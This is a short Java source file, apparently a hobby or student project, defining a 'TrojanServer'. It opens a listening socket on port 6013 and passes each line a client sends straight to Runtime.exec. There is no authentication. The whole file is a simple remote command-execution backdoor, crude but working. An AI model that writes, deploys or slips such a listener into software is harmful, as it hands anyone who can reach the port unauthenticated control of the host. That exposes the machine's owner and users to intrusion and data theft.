
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.ServerSocket;
import java.net.Socket;

/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */

/**
 *
 * @author Carlos 
 */
public class TrojanServer
{

    /**
     * @param args the command line arguments
     */
    public static void main(String[] args)
    {
        // TODO code application logic here
        String port = "6013";
        TrojanServer b = new TrojanServer(port);
        
    }
ServerSocket ssock = null;
Socket sock = null;
int count = 0;
    private TrojanServer(String port)
    {
        try{
            ssock = new ServerSocket(Integer.parseInt(port));
        }
        catch (Exception e)
        {
            System.err.println("ERROR: cannot list on port: " + port);
            System.exit(1);
        }
        System.out.println("Waiting for remote command from client...");
        try{
            while (true)
            {
                sock = ssock.accept();
                System.out.println("Connection established." + ++count);
                process();
            }
        }
        catch (Exception e)
        {
            System.out.println("Problem making a connection with client");
            System.out.println(e);
        }
        
    }
    
    public void process() throws IOException
    {
        try{
            PrintWriter out = new PrintWriter(sock.getOutputStream(),true);
            BufferedReader in = new BufferedReader(new InputStreamReader(sock.getInputStream()));
            String fromClient = null;
            String toClient = null;
            fromClient = in.readLine();
            System.out.println("Received From Client: " + fromClient);
            toClient = "Executed command on server successfully";
            String command = fromClient;
            try{
                Process p = Runtime.getRuntime().exec(command);
            }
            catch(Exception e)
            {
                System.out.println("Failed to execute command: " + command);
                toClient = "Failed execute command: " + command;
            }
            
            out.println(toClient);
            out.close();
            in.close();
            sock.close();
        }
        catch (Exception e)
        {
            System.out.println("An error occured!");
            System.out.println(e);
        }
    }
    
}
